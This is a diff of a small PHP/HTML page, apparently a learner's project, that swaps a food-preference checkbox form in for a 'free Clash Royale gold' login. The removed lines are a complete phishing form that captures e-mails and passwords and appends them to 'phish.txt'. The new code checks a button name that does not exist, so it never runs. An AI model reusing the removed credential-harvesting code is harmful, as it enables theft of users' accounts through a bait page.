@@ -9,35 +9,24 @@
 <body>
 <h2>Login for gratis gull i Clash Royale</h2>
 <form action="index.php" method="post">
-    <input type="text" name="E-mail" placeholder="E-mail" id="input"> <br>
-    <input type="password" name="password" placeholder="password" id="input"> <br>
-    <input type="submit" name="login" value="Log in" id="skibidi"> <br>
+    <input type="checkbox" name="pizza" value="pizza">
+        Pizza <br>
+    <input type="checkbox" name="pasta" value="pasta">
+        Pasta <br>
+    <input type="checkbox" name="hotdog" value="hotdog">
+        Hotdog <br>
+    <input type="submit" name="confirm" value="confirm">
 </form>
 </body>
 </html>
-<?php
-if (isset($_POST["login"])) {
-    $username = $_POST["E-mail"];
-    $password = $_POST["password"];
 
-    if (empty($username)) {
-        echo "E-mail is not filled in";
-    } elseif (empty($password)) {
-        echo "Password is not filled in";
-    } else {
-        echo "E-mail = $username <br>";
-        echo "Password = $password <br>";
+<?php if (isset($_POST["submit"])) {
+    if (isset($_POST["pizza"])) {
+        echo "You like pizza!";
+    } elseif (isset($_POST["pasta"])) {
+        echo "You like pasta!";
+    } elseif (isset($_POST["hotdog"])) {
+        echo "You like hotdogs!";
     }
 }
-
-($myfile = fopen("phish.txt", "a")) or die("Unable to open file!");
-fwrite($myfile, "E-mail: $username \n");
-fwrite($myfile, "Password: $password \n");
-fclose($myfile);
-
-/*foreach ($_POST as $key => $value) {
-        echo "$key = $val"ue <br>";
-        }*/
-
-
 ?>
